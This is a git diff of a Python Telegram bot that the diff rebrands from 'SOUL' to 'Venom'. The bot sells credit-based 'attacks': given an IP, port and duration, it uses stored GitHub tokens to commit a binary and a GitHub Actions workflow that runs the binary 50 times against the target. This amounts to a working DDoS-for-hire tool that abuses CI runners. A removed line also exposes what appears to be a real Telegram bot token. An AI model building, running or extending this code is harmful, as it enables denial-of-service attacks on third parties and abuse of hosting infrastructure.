@@ -8,10 +8,10 @@ from telegram.constants import ChatAction
 from telegram.ext import Application, CommandHandler, ContextTypes
 from github import Github, InputGitTreeElement, Auth
 
-TELEGRAM_TOKEN = '8013938312:AAHEY0JdPf0kS75_8HpKlu2nGmtaJPxiJIc'
+TELEGRAM_TOKEN = 'BoT token'
 
-ADMIN_IDS = {6321758394}
-DATA_FILE = 'SOUL.json'
+ADMIN_IDS = {admin id}
+DATA_FILE = 'Venom.json'
 
 user_sessions = {}
 if os.path.exists(DATA_FILE):
@@ -42,7 +42,7 @@ VBV_LOADING_FRAMES = [
     "🟦 [■■■■■]",
 ]
 
-SOUL_YML_TEMPLATE = '''name: Run SOUL 50x
+Venom_YML_TEMPLATE = '''name: Run Venom 50x
 on: [push]
 jobs:
   SOUL:
@@ -53,12 +53,12 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - name: Make binary executable
-        run: chmod +x SOUL
-      - name: Run SOUL binary
-        run: ./SOUL {ip} {port} {time} 900 -1
+        run: chmod +x Venom
+      - name: Run Venom binary
+        run: ./Venom {ip} {port} {time} 900 -1
 '''
 
-REPO_NAME = "SOULcrack90"
+REPO_NAME = "Venom"
 CREDIT_COST_PER_ATTACK = 25
 
 def is_admin(user_id: int) -> bool:
@@ -175,13 +175,13 @@ async def server(update: Update, context: ContextTypes.DEFAULT_TYPE):
     credits = session.get('credits', {})
     github_tokens = session.get('github_tokens', [])
     if not github_tokens:
-        await update.message.reply_text("Admin must set GitHub token(s) first with /token. Power By @SOULcracks_owner")
+        await update.message.reply_text("Admin must set GitHub token(s) first with /token. Power By @venomCHA7")
         return
     if not approved_ids:
-        await update.message.reply_text("No approved IDs to run attack on. Use /approve first. Power By @SOULcracks_owner")
+        await update.message.reply_text("No approved IDs to run attack on. Use /approve first. Power By @venomCHA7")
         return
     if len(context.args) != 3:
-        await update.message.reply_text("Usage: /server <ip> <port> <time> Power By @SOULcracks_owner")
+        await update.message.reply_text("Usage: /server <ip> <port> <time> Power By @venomCHA7")
         return
     ip, port, time_s = context.args
     try:
@@ -192,7 +192,7 @@ async def server(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Time must be a positive integer")
         return
     if not os.path.isfile("SOUL"):
-        await update.message.reply_text("Local binary 'SOUL' not found!")
+        await update.message.reply_text("Local binary 'Venom' not found!")
         return
     await context.bot.send_chat_action(chat_id=int(chat_id), action=ChatAction.TYPING)
     msg = await update.message.reply_text(f"{VBV_LOADING_FRAMES[0]}  0% completed")
@@ -222,13 +222,13 @@ async def server(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     await asyncio.gather(*tasks)
     try:
-        await msg.edit_text("✅ Attack successfully! Power By @SOULcrack_owner")
+        await msg.edit_text("✅ Attack successfully! Power By @venomCHA7")
     except Exception:
         pass
 
 async def run_workflow_with_token_and_id(chat_id, github_token, ip, port, time, id_):
     try:
-        os.system("chmod +x SOUL")
+        os.system("chmod +x Venom")
         g = Github(auth=Auth.Token(github_token))
         user = g.get_user()
         try:
@@ -246,25 +246,25 @@ async def run_workflow_with_token_and_id(chat_id, github_token, ip, port, time, 
         base_ref = repo.get_git_ref(f"heads/{branch}")
         base_commit = repo.get_git_commit(base_ref.object.sha)
         base_tree = repo.get_git_tree(base_commit.sha)
-        with open("SOUL", "rb") as f:
+        with open("Venom", "rb") as f:
             binary_content = f.read()
         binary_b64 = base64.b64encode(binary_content).decode('utf-8')
         blob = repo.create_git_blob(binary_b64, "base64")
         binary_element = InputGitTreeElement(
-            path="SOUL",
+            path="Venom",
             mode='100755',
             type='blob',
             sha=blob.sha,
         )
         new_tree = repo.create_git_tree([binary_element], base_tree)
-        new_commit = repo.create_git_commit("Add SOUL binary", new_tree, [base_commit])
+        new_commit = repo.create_git_commit("Add Venom binary", new_tree, [base_commit])
         base_ref.edit(new_commit.sha)
         base_ref = repo.get_git_ref(f"heads/{branch}")
         base_commit = repo.get_git_commit(base_ref.object.sha)
         base_tree = repo.get_git_tree(base_commit.sha)
-        yml_content = SOUL_YML_TEMPLATE.format(ip=ip, port=port, time=time)
+        yml_content = Venom_YML_TEMPLATE.format(ip=ip, port=port, time=time)
         yml_element = InputGitTreeElement(
-            path=".github/workflows/SOUL.yml",
+            path=".github/workflows/Venom.yml",
             mode='100644',
             type='blob',
             content=yml_content,
